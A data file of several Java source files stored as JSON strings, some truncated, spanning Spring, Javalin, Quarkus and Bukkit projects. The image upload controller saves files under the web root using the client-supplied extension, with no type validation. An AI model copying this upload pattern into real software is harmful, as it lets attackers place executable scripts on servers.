    "package com.example.configurationservice.configuration;\n\nimport org.springdoc.core.properties.AbstractSwaggerUiConfigProperties;\nimport org.springdoc.core.properties.SwaggerUiConfigParameters;\nimport org.springframework.cloud.context.config.annotation.RefreshScope;\nimport org.springframework.cloud.gateway.event.RefreshRoutesResultEvent;\nimport org.springframework.cloud.gateway.route.CachingRouteLocator;\nimport org.springframework.cloud.gateway.route.Route;\nimport org.springframework.cloud.gateway.route.RouteLocator;\nimport org.springframework.cloud.gateway.route.builder.RouteLocatorBuilder;\nimport org.springframework.context.ApplicationListener;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport reactor.core.publisher.Flux;\n\nimport java.util.concurrent.atomic.AtomicBoolean;\n\n@Configuration\npublic class ListenerConfig {\n\n    private final AtomicBoolean ws = new AtomicBoolean(false);\n    private static final AbstractSwaggerUiConfigProperties.SwaggerUrl swaggerUrl = new AbstractSwaggerUiConfigProperties.SwaggerUrl(\"route\", null, \"route\");\n\n    final SwaggerUiConfigParameters swaggerUiParameters;\n\n    public ListenerConfig(SwaggerUiConfigParameters swaggerUiParameters) {\n        this.swaggerUiParameters = swaggerUiParameters;\n    }\n\n    //@Bean\n    //@RefreshScope\n    public RouteLocator gateway(RouteLocatorBuilder rlb) {\n        var id = \"customers\";\n        //if (!this.ws.get()) {\n        this.ws.set(true);\n        return rlb.routes()\n                .route(id, routeSpec -> {\n                    return routeSpec.path(\"/customers\").uri(\"lb://customers/\");\n                }).build();\n        // }\n\n//        return rlb.routes()\n//                .route(id, routeSpec -> {\n//                    return routeSpec\n//                            .path(\"/customers\")\n//                            .filters(gatewayFilterSpec -> {\n//                               return gatewayFilterSpec.setPath(\"/websocket\");\n//                            })\n//                            .uri(\"lb://customers/\");\n//                }).build();\n\n    }\n\n    @Bean\n    public ApplicationListener<RefreshRoutesResultEvent> routesRefresh() {\n\n        // for reloading config\n        // curl -XPOST http://localhost:9999/actuator/refresh => reloading configuration with this curl\n        return new ApplicationListener<RefreshRoutesResultEvent>() {\n            @Override\n            public void onApplicationEvent(RefreshRoutesResultEvent event) {\n                System.out.println(\"routes updated\");\n                var crl = (CachingRouteLocator) event.getSource();\n                Flux<Route> routes = crl.getRoutes();\n\n                routes\n                        .filter(route -> {\n                            return route.getId().matches(\".*-swagger\");\n                        })\n                        .map(route -> {\n                            return route.getId().replace(\"-swagger\", \"\");\n                        })\n                        .subscribe(route -> {\n                            swaggerUrl.setName(route);\n                            swaggerUrl.setDisplayName(route);\n                            if (!swaggerUiParameters.getUrls().contains(swaggerUrl)) {\n                                swaggerUiParameters.addGroup(route);\n                            }\n                        });\n\n/*                routes.subscribe(route -> {\n                    System.out.println(route);\n                });*/\n\n                routes.subscribe(System.out::println);\n            }\n        };\n\n    }\n\n}\n",
    "package com.whatsapp.model;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport jakarta.persistence.Column;\nimport jakarta.persistence.Entity;\nimport jakarta.persistence.GeneratedValue;\nimport jakarta.persistence.GenerationType;\nimport jakarta.persistence.Id;\nimport jakarta.persistence.JoinColumn;\nimport jakarta.persistence.ManyToMany;\nimport jakarta.persistence.ManyToOne;\nimport jakarta.persistence.OneToMany;\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.EqualsAndHashCode;\nimport lombok.NoArgsConstructor;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Entity\n@EqualsAndHashCode\npublic class Chat {\n\n\t@Id\n\t@GeneratedValue(strategy = GenerationType.AUTO)\n\tprivate Integer id;\n\n\tprivate String chat_name;\n\t\n\tprivate String chat_image;\n\t\n\t@Column(name = \"is_group\")\n\tprivate boolean isGroup;\n\t\n\t@ManyToMany\n\tprivate Set<User> admins = new HashSet<>();\n\t\n\t@JoinColumn(name = \"created_by\")\n\t@ManyToOne\n\tprivate User createdby;\n\t\n\t@ManyToMany\n\tprivate Set<User> users = new HashSet<>();\n\t\n\t@OneToMany\n\tprivate List<Message> messages= new ArrayList<>();\n\t\n}\n/*\n   \n   Represents a conversation or chat between users.\n   Each chat has a unique ID.\n   A chat can have multiple messages sent by different users.\n   Users participate in chats by sending messages.\n   \n*/",
    "package groupone.controllers;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.SerializationFeature;\nimport com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;\nimport groupone.daos.EventDAO;\nimport groupone.dtos.*;\nimport groupone.enums.Category;\nimport groupone.enums.Status;\nimport groupone.model.Event;\nimport groupone.model.User;\nimport io.javalin.http.Handler;\nimport io.javalin.http.HttpStatus;\nimport org.hibernate.Hibernate;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.stream.Collectors;\n\n/**\n * The EventController class handles the routing for event-related requests.\n * It uses an instance of EventDAO to interact with the database, and an ObjectMapper to map between objects.\n */\npublic class EventController {\n    /**\n     * A singleton instance of EventDAO used for database operations related to events.\n     * The instance is fetched once and reused for all database operations.\n     */\n    private static EventController instance;\n    private static EventDAO eventDAO;\n\n    /**\n     * An ObjectMapper used for mapping between different object types.\n     * It is configured to not fail on empty beans and to support Java Time objects.\n     */\n    @SuppressWarnings({\"FieldMayBeFinal\", \"unused\"})\n    private static ObjectMapper objectMapper = new ObjectMapper().configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false).registerModule(new JavaTimeModule());\n\n    public static EventController getInstance(Boolean isTesting) {\n        if (instance == null) {\n            instance = new EventController();\n            eventDAO = EventDAO.getInstance(isTesting);\n        }\n        return instance;\n    }\n\n\n    /**\n     * Handler for the \"getAllEvents\" route.\n     * This handler fetches all events from the database, maps them to DTOs, and sends them as the response.\n     * The response includes the event details, locations, and zipcodes.\n     *\n     * @return A Handler that can be used with Javalin to handle requests to the \"getAllEvents\" route.\n     */\n    public Handler getAllEvents() {\n        return ctx -> {\n            // Fetch all events from the database\n            List<Event> eventList = eventDAO.getAll();\n\n            // Map each event to an EventDTO\n            List<EventDTO> eventDTOs = eventList.stream()\n                    .map(EventDTO::new)\n                    .toList();\n            ctx.json(eventDTOs);\n            // TODO had to refactor a bit, check if you want to the below code to stay.\n           /* // Map each location of each event to a LocationDTO, including the zipcodes\n            List<LocationDTO> locationDTOS = eventList.stream()\n                    .flatMap(event -> event.getLocations().stream()\n                            .map(location -> {\n                                LocationDTO locationDTO = new LocationDTO(\n                                        location.getId(),\n                                        location.getStreet(),\n                                        new EventSpecsDTO(location.getEventSpec())\n                                );\n                                locationDTO.setZipcode(new ZipcodeDTO(location.getZipcodes()));\n                                return locationDTO;\n                            })\n                    )\n                    .toList();\n\n            // Map each EventDTO to a SuperEventDTO and add the corresponding LocationDTOs\n            List<SuperEventDTO> completeEvents = new ArrayList<>();\n            for (EventDTO e : eventDTOs) {\n                SuperEventDTO event = new SuperEventDTO(e);\n                for (LocationDTO locationDTO : locationDTOS) {\n                    if (e.getId() == locationDTO.getId()) {\n                        event.getLocations().add(locationDTO);\n                        completeEvents.add(event);\n                    }\n                }\n            }\n\n            // Send the list of SuperEventDTOs as the response\n            ctx.json(completeEvents);*/\n        };\n    }\n\n    /**\n     * Handler for the \"getEventsById\" route.\n     * This handler fetches an event from the database by its ID, maps it to a DTO, and sends it as the response.\n     * The response includes the event details.\n     *\n     * @return A Handler that can be used with Javalin to handle requests to the \"getEventsById\" route.\n     */\n    public Handler getEventById() {\n        return ctx -> {\n            // Fetch the event from the database by its ID\n            int id = Integer.parseInt(ctx.pathParam(\"id\"));\n            Event event = eventDAO.getById(id);\n            EventDTO eventDTO = new EventDTO(event);\n            ctx.json(eventDTO);\n            // TODO had to refactor a bit, check if you want to the below code to stay.\n           /* // Map the event to an EventDTO\n            EventDTO eventDTO = new EventDTO(event.getId(), event.getImageUrl(), event.getTitle(), event.getDescription(), event.getPrice());\n            // Map each location of the event to a LocationDTO, including the zipco",
    "package com.work.controller;\n\nimport java.io.File;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.UUID;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.multipart.commons.CommonsMultipartFile;\n\nimport com.work.common.utils.BaseUtil;\nimport com.work.common.utils.JsonUtil;\n\n\n@Controller\n@RequestMapping(\"/imageUpload\")\npublic class ImageUploadController extends BaseUtil {\n\t//\u4e0a\u4f20\u5934\u50cf\n\t@RequestMapping(value = \"/headerImage\")\n\tpublic void headerImage(@RequestParam(value = \"file\") CommonsMultipartFile file, HttpServletRequest request,\n\t\t\tHttpServletResponse response) throws Exception {\n\t\tSimpleDateFormat format = new SimpleDateFormat(\"yyyyMMddHHmmss\");\n\t\tString respJson = null;\n\t\tif (file == null) {\n\t\t\trespJson = JsonUtil.buildFalseJson(-1, \"\u4e0a\u4f20\u6587\u4ef6\u4e3a\u7a7a!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tif (file.getSize() > 5000000) { // 5M\n\t\t\trespJson = JsonUtil.buildFalseJson(-2, \"\u6587\u4ef6\u5927\u5c0f\u9650\u5236\u57285M\u4ee5\u5185!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tDate now = new Date();\n\t\tString random = UUID.randomUUID().toString().replace(\"-\", \"\").substring(0, 5);\n\t\tString houzui = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(\".\"),\n\t\t\t\tfile.getOriginalFilename().length());\n\t\tString filename = format.format(now) + random + houzui;// \u6587\u4ef6\u540d\n\t\tString path = request.getServletContext().getRealPath(\"/\") + \"headerImages\" + \"/\" + filename;// \u6587\u4ef6\u6240\u5728\u76d8\u8def\u5f84\n\n\t\tString contextPath = request.getContextPath();// \u9879\u76ee\u540d\n\t\tString port = request.getServerPort() == 80 ? \"\" : \":\" + request.getServerPort();\n\t\tString url = request.getScheme() + \"://\" + request.getServerName() + port + contextPath + \"/headerImages/\"\n\t\t\t\t+ filename;\n\t\tFile oldFile = new File(path);\n\t\tfile.transferTo(oldFile);\n\t\trespJson = JsonUtil.buildFalseJson(0, url);\n\t\toutput(response, respJson);\n\t}\n\t//\u517c\u804c\u56fe\u7247\n\t@RequestMapping(value = \"/workImage\")\n\tpublic void workImage(@RequestParam(value = \"file\") CommonsMultipartFile file, HttpServletRequest request,\n\t\t\tHttpServletResponse response) throws Exception {\n\t\tSimpleDateFormat format = new SimpleDateFormat(\"yyyyMMddHHmmss\");\n\t\tString respJson = null;\n\t\tif (file == null) {\n\t\t\trespJson = JsonUtil.buildFalseJson(-1, \"\u4e0a\u4f20\u6587\u4ef6\u4e3a\u7a7a!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tif (file.getSize() > 5000000) { // 5M\n\t\t\trespJson = JsonUtil.buildFalseJson(-2, \"\u6587\u4ef6\u5927\u5c0f\u9650\u5236\u57285M\u4ee5\u5185!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tDate now = new Date();\n\t\tString random = UUID.randomUUID().toString().replace(\"-\", \"\").substring(0, 5);\n\t\tString houzui = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(\".\"),\n\t\t\t\tfile.getOriginalFilename().length());\n\t\tString filename = format.format(now) + random + houzui;// \u6587\u4ef6\u540d\n\t\tString path = request.getServletContext().getRealPath(\"/\") + \"workImages\" + \"/\" + filename;// \u6587\u4ef6\u6240\u5728\u76d8\u8def\u5f84\n\n\t\tString contextPath = request.getContextPath();// \u9879\u76ee\u540d\n\t\tString port = request.getServerPort() == 80 ? \"\" : \":\" + request.getServerPort();\n\t\tString url = request.getScheme() + \"://\" + request.getServerName() + port + contextPath + \"/workImages/\"\n\t\t\t\t+ filename;\n\t\tFile oldFile = new File(path);\n\t\tfile.transferTo(oldFile);\n\t\tSystem.out.println(\"file:\"+oldFile.getAbsolutePath());\n\t\trespJson = JsonUtil.buildFalseJson(0, url);\n\t\toutput(response, respJson);\n\t}\n\t//\u5e16\u5b50\u56fe\u7247\n\t@RequestMapping(value = \"/forumImage\")\n\tpublic void forumImage(@RequestParam(value = \"file\") CommonsMultipartFile file, HttpServletRequest request,\n\t\t\tHttpServletResponse response) throws Exception {\n\t\tSimpleDateFormat format = new SimpleDateFormat(\"yyyyMMddHHmmss\");\n\t\tString respJson = null;\n\t\tif (file == null) {\n\t\t\trespJson = JsonUtil.buildFalseJson(-1, \"\u4e0a\u4f20\u6587\u4ef6\u4e3a\u7a7a!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tif (file.getSize() > 5000000) { // 5M\n\t\t\trespJson = JsonUtil.buildFalseJson(-2, \"\u6587\u4ef6\u5927\u5c0f\u9650\u5236\u57285M\u4ee5\u5185!\");\n\t\t\toutput(response, respJson);\n\t\t\treturn;\n\t\t}\n\t\tDate now = new Date();\n\t\tString random = UUID.randomUUID().toString().replace(\"-\", \"\").substring(0, 5);\n\t\tString houzui = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(\".\"),\n\t\t\t\tfile.getOriginalFilename().length());\n\t\tString filename = format.format(now) + random + houzui;// \u6587\u4ef6\u540d\n\t\tString path = request.getServletContext().getRealPath(\"/\") + \"forumImages\" + \"/\" + filename;// \u6587\u4ef6\u6240\u5728\u76d8\u8def\u5f84\n\n\t\tString contextPath = request.getContextPath();// \u9879\u76ee\u540d\n\t\tString port = request.getServerPort() == 80 ? \"\" : \":\" + request.getServerPort();\n\t\tString url = request.getScheme() + \"://\" + request.getServerName() + port + contextPath + \"/forumImages/\"\n\t\t\t\t+ filename;\n\t\tFile oldFile = new File(path);\n\t\tfile.transferTo(oldFile);\n\t\trespJson = JsonUtil.buildFalseJson(0, url);\n\t\toutput(response, respJson);\n\t}\n\t//\u804a\u5929\u56fe\u7247\n\t@RequestMapping(value = \"/chatImage\")\n\tpublic void chatImage(@RequestParam(value = \"file\") CommonsMultipartFil",
    "///usr/bin/env jbang \"$0\" \"$@\" ; exit $?\n\n//JAVA 21+\n\n//DEPS com.h2database:h2-mvstore:2.2.224\n//DEPS org.eclipse.jgit:org.eclipse.jgit:6.9.0.202403050737-r\n//DEPS org.kohsuke:github-api:1.321\n//DEPS info.picocli:picocli:4.7.5\n//DEPS one.util:streamex:0.8.2\n//DEPS me.tongfei:progressbar:0.10.1\n//DEPS org.eclipse.collections:eclipse-collections:11.1.0\n\n//DEPS org.tinylog:tinylog-api:2.7.0\n//DEPS org.tinylog:tinylog-impl:2.7.0\n//DEPS org.tinylog:slf4j-tinylog:2.7.0 // because of jgit\n//FILES tinylog.properties\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Comparator;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Set;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.concurrent.Callable;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport java.util.stream.Collectors;\n\nimport me.tongfei.progressbar.ProgressBar;\nimport one.util.streamex.StreamEx;\nimport org.eclipse.collections.api.multimap.MutableMultimap;\nimport org.eclipse.collections.impl.factory.Multimaps;\nimport org.tinylog.Logger;\n\nimport org.eclipse.jgit.api.Git;\nimport org.eclipse.jgit.lib.Repository;\nimport org.eclipse.jgit.revwalk.RevCommit;\nimport org.eclipse.jgit.revwalk.RevWalk;\nimport org.h2.mvstore.MVMap;\nimport org.h2.mvstore.MVStore;\nimport org.kohsuke.github.GHPullRequest;\nimport org.kohsuke.github.GHPullRequestCommitDetail;\nimport org.kohsuke.github.GHRepository;\nimport org.kohsuke.github.GHUser;\nimport org.kohsuke.github.GitHub;\nimport org.kohsuke.github.PagedIterator;\nimport org.kohsuke.github.PagedSearchIterable;\n\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\n@Command(name = \"gcl\",\n        version = \"gcl 0.1.0\",\n        mixinStandardHelpOptions = true,\n        sortSynopsis = false)\npublic class gcl implements Callable<Integer> {\n\n    @Parameters(index = \"0\", description = \"The path to the git repository to analyse.\")\n    private Path repositoryPath;\n\n    @Option(names = \"--startrevision\", description = \"The first revision to check (tag or commit id). Excluded.\")\n    private String startCommitRevStr = \"v5.12\";\n\n    @Option(names = \"--endrevision\", description = \"The last revision to check (tag or commit id). Included.\")\n    private String endCommitRevStr = \"v5.13\";\n\n    @Option(names = \"--owner\", description = \"The GitHub owner of the repository\")\n    private String owner = \"JabRef\";\n\n    @Option(names = \"--repo\", description = \"The GitHub repository name\")\n    private String repository = \"jabref\";\n\n    @Option(names = \"--cols\", description = \"Number of columns\")\n    private Integer cols  = 6;\n\n    @Option(names = \"--filter\")\n    private List<String> ignoredUsers = List.of(\"koppor\", \"calixtus\", \"Siedlerchr\", \"tobiasdiez\", \"but\", \"k3KAW8Pnf7mkmdSMPHz27\", \"HoussemNasri\", \"dependabot[bot]\", \"dependabot\", \"apps/dependabot\", \"apps/githubactions\", \"ThiloteE\");\n\n    @Option(names = \"--filter-emails\")\n    private List<String> ignoredEmails = List.of(\n            \"118344674+github-merge-queue@users.noreply.github.com\", \"github-merge-queue@users.noreply.github.com\", \"gradle-update-robot@regolo.cc\", \"team@moderne.io\", \"49699333+dependabot[bot]@users.noreply.github.com\",\n            \"houssemnasri2001@gmail.com\", \"cc.snethlage@gmail.com\", \"50491877+calixtus@users.noreply.github.com\", \"siedlerkiller@gmail.com\", \"Siedlerchr@users.noreply.github.com\", \"320228+Siedlerchr@users.noreply.github.com\");\n\n    @Option(names = { \"-l\", \"--github-lookup\" }, description = \"Should calls be made to GitHub's API for user information\", negatable = true)\n    boolean ghLookup = true;\n\n    @Option(names = {\"-m\", \"--lgin-mapping\"}, description = {\"Mapping of GitHub logins to names. Format: name=login\"})\n    Map<String, String> loginMapping = Map.of(\"shawn.jj\", \"shawn-jj\",\n            \"Harshit.Gupta7\", \"harsh1898\",\n            \"Ramandeep Singh\", \"rdsingh13\",\n            \"luklehnert\", \"lwlR\",\n            \"Filippa Nilsson\", \"filippanilsson\",\n            \"Houssem Nasri\", \"HoussemNasri\",\n            \"Anish.Pal\", \"pal-anish\");\n\n    private static final String avatarImgWidth = \"117\";\n\n    private static final String githubUsersEmailSuffix = \"@users.noreply.github.com\";\n\n    private record Contributor(String name, String url, String avatarUrl) implements Serializable {\n    }\n\n    private record CoAuthor(String name, String email) {\n        public CoAuthor(String line) {\n            this(line.substring(\"Co-authored-by: \".length(), line.indexOf('<')).trim(),\n                    line.substring(line.indexOf('<') + 1, line.indexOf('>')).trim());\n            Logger.trace(\"Parsed \\\"{}\\\" into {}\", line, this);\n        }\n    }\n\n    private SortedSet<Contributor> contributors = new TreeSet<>((",
    "package io.quarkiverse.antora.test;\n\nimport static io.restassured.RestAssured.given;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\nimport org.awaitility.Awaitility;\nimport org.hamcrest.CoreMatchers;\nimport org.junit.jupiter.api.Test;\n\nimport io.restassured.RestAssured;\nimport io.restassured.http.ContentType;\nimport io.restassured.response.ValidatableResponse;\n\npublic class AntoraDevModeTest {\n\n    @Test\n    public void edit() throws InterruptedException, IOException {\n\n        final Path baseDir = Path.of(\".\").toAbsolutePath().normalize();\n        try (DevModeProcess devMode = new DevModeProcess(baseDir)) {\n            {\n                final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                        () -> {\n                            try {\n                                return RestAssured\n                                        .given()\n                                        .contentType(ContentType.HTML)\n                                        .get(\"http://localhost:8080/antora/quarkus-antora/dev/index.html\")\n                                        .then();\n                            } catch (Exception e) {\n                                /* The reload of the service takes some time */\n                                return null;\n                            }\n                        },\n                        resp -> resp != null && resp.extract().statusCode() == 200);\n                response\n                        .body(CoreMatchers.containsString(\"<h1 class=\\\"page\\\">Quarkus Antora</h1>\"));\n            }\n\n            /* Make sure new.adoc does not exist yet */\n            RestAssured\n                    .given()\n                    .contentType(ContentType.HTML)\n                    .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                    .then()\n                    .statusCode(404);\n\n            /* Add new.adoc */\n            Path newFile = baseDir.resolve(\"modules/ROOT/pages/new.adoc\");\n            String uniqueContent = UUID.randomUUID().toString();\n            try {\n                Files.writeString(newFile, \"= New Page\\n\\n\" + uniqueContent, StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                                            .contentType(ContentType.HTML)\n                                            .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                                            .then();\n                                } catch (Exception e) {\n                                    /* The reload of the service takes some time */\n                                    return null;\n                                }\n                            },\n                            resp -> resp != null && resp.extract().statusCode() == 200);\n                    response.body(CoreMatchers.containsString(uniqueContent));\n                }\n\n                /* Add an invalid link to new.adoc */\n                Files.writeString(newFile, \"= New Page\\n\\nxref:non-existent-page.adoc[non-existent]\", StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                                            .contentType(ContentType.HTML)\n                                            .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                                            .then();\n                                } catch (Exception e) {\n                                    /* The reload of the service takes some time */\n                                    return null;\n                                }\n                            },\n                            resp -> resp != null && resp.extract().statusCode() == 500);\n                    response.body(CoreMatchers.containsString(\"target of xref not found: non-existent-page.adoc\"));\n                }\n\n                /* Fix it */\n                Files.writeString(newFile, \"= New Page\\n\\n\" + uniqueContent, StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                       ",
    "/*\n * This file is part of FastBoard, licensed under the MIT License.\n *\n * Copyright (c) 2019-2023 MrMicky\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\npackage pine.toast.library.utilities.fastboard;\n\nimport org.bukkit.entity.Player;\nimport pine.toast.library.utilities.WonderlandColors;\n\nimport java.lang.invoke.MethodHandle;\nimport java.lang.invoke.MethodHandles;\nimport java.lang.invoke.MethodType;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\nimport java.util.*;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.stream.Stream;\n\n/**\n * Lightweight packet-based scoreboard API for Bukkit plugins.\n * It can be safely used asynchronously as everything is at packet level.\n * <p>\n * The project is on <a href=\"https://github.com/MrMicky-FR/FastBoard\">GitHub</a>.\n *\n * @author MrMicky\n * @version 2.1.0\n */\n@SuppressWarnings(\"unused\")\npublic abstract class FastBoardBase<T> {\n\n    private static final Map<Class<?>, Field[]> PACKETS = new HashMap<>(8);\n    protected static final String[] COLOR_CODES = Arrays.stream(WonderlandColors.getEntries().toArray())\n            .map(Object::toString)\n            .toArray(String[]::new);\n    private static final VersionType VERSION_TYPE;\n    // Packets and components\n    private static final Class<?> CHAT_COMPONENT_CLASS;\n    private static final Class<?> CHAT_FORMAT_ENUM;\n    private static final Object RESET_FORMATTING;\n    private static final MethodHandle PLAYER_CONNECTION;\n    private static final MethodHandle SEND_PACKET;\n    private static final MethodHandle PLAYER_GET_HANDLE;\n    private static final MethodHandle FIXED_NUMBER_FORMAT;\n    // Scoreboard packets\n    private static final FastReflection.PacketConstructor PACKET_SB_OBJ;\n    private static final FastReflection.PacketConstructor PACKET_SB_DISPLAY_OBJ;\n    private static final FastReflection.PacketConstructor PACKET_SB_TEAM;\n    private static final FastReflection.PacketConstructor PACKET_SB_SERIALIZABLE_TEAM;\n    private static final MethodHandle PACKET_SB_SET_SCORE;\n    private static final MethodHandle PACKET_SB_RESET_SCORE;\n    // Scoreboard enums\n    private static final Class<?> DISPLAY_SLOT_TYPE;\n    private static final Class<?> ENUM_SB_HEALTH_DISPLAY;\n    private static final Class<?> ENUM_SB_ACTION;\n    private static final Object BLANK_NUMBER_FORMAT;\n    private static final Object SIDEBAR_DISPLAY_SLOT;\n    private static final Object ENUM_SB_HEALTH_DISPLAY_INTEGER;\n    private static final Object ENUM_SB_ACTION_CHANGE;\n    private static final Object ENUM_SB_ACTION_REMOVE;\n\n    static {\n        try {\n            MethodHandles.Lookup lookup = MethodHandles.lookup();\n\n            if (FastReflection.isRepackaged()) {\n                VERSION_TYPE = VersionType.V1_17;\n            } else if (FastReflection.nmsOptionalClass(null, \"ScoreboardServer$Action\").isPresent()) {\n                VERSION_TYPE = VersionType.V1_13;\n            } else if (FastReflection.nmsOptionalClass(null, \"IScoreboardCriteria$EnumScoreboardHealthDisplay\").isPresent()) {\n                VERSION_TYPE = VersionType.V1_8;\n            } else {\n                VERSION_TYPE = VersionType.V1_7;\n            }\n\n            String gameProtocolPackage = \"network.protocol.game\";\n            Class<?> craftPlayerClass = FastReflection.obcClass(\"entity.CraftPlayer\");\n            Class<?> entityPlayerClass = FastReflection.nmsClass(\"server.level\", \"EntityPlayer\");\n            Class<?> playerConnectionClass = FastReflection.nmsClass(\"server.network\", \"PlayerConnection\");\n            Class<?> packetClass = FastReflection.nmsClass(\"network.protocol\", \"Packet\");\n            Class<?> packetSbObjClass = FastReflection.nmsClass(gameProtocolPackage, \"PacketPlayOutScoreboardObjective\");\n            Class<?> packetSbDisplayObjClass = FastReflection.nmsClass(gameProtocolPackage, \"PacketPlayOutScoreboardDisplayObjective\");\n            Class<?> packetSbScoreClass = FastReflection.nms",
    "package ma.achraf.hopital.service;\r\n\r\nimport jakarta.transaction.Transactional;\r\nimport ma.achraf.hopital.Repositories.ConsultationRepository;\r\nimport ma.achraf.hopital.Repositories.MedecinRepository;\r\nimport ma.achraf.hopital.Repositories.PatientRepository;\r\nimport ma.achraf.hopital.Repositories.RendezVousRepository;\r\nimport ma.achraf.hopital.entities.Consultation;\r\nimport ma.achraf.hopital.entities.Medecin;\r\nimport ma.achraf.hopital.entities.Patient;\r\nimport ma.achraf.hopital.entities.RendezVous;\r\nimport org.springframework.stereotype.Service;\r\n\r\nimport java.util.UUID;\r\n\r\n//lA COUCHE METIER\r\n@Service // les obj de la couche metier generalment utilise la notation service\r\n@Transactional // toutes les methode soit generalment transactionnelle\r\npublic class HospitalServiceImpl implements IHospitalService { // une class qui  implement l interface\r\n    private PatientRepository patientRepository ;\r\n    private MedecinRepository medecinRepository;\r\n    private RendezVousRepository rendezVousRepository;\r\n    private ConsultationRepository consultationRepository;\r\n    public HospitalServiceImpl(PatientRepository patientRepository, MedecinRepository medecinRepository, RendezVousRepository rendezVousRepository, ConsultationRepository consultationRepository) {\r\n        this.patientRepository = patientRepository;\r\n        this.medecinRepository = medecinRepository;\r\n        this.rendezVousRepository = rendezVousRepository;\r\n        this.consultationRepository = consultationRepository;\r\n    }\r\n    // tous ca en haut c est l injection des DPNDC\r\n    @Override\r\n    public Patient savePatient(Patient patient) {\r\n        return patientRepository.save(patient);\r\n    }\r\n    @Override\r\n    public Medecin saveMedecin(Medecin medecin) {\r\n        return medecinRepository.save(medecin);\r\n    }\r\n    @Override\r\n    public RendezVous saveRendezVous(RendezVous rendezVous) {\r\n        rendezVous.setId(UUID.randomUUID().toString()); // (Universally Unique Identifiers ) genere une chaine de caracter aleatoire mais il est unique qu ils dependet la datte de systm genere a manier Aleatoire\r\n        return rendezVousRepository.save(rendezVous);\r\n    }\r\n    @Override\r\n    public Consultation saveConsultation(Consultation consultation) {\r\n        return consultationRepository.save(consultation);\r\n    }\r\n}\r\n",
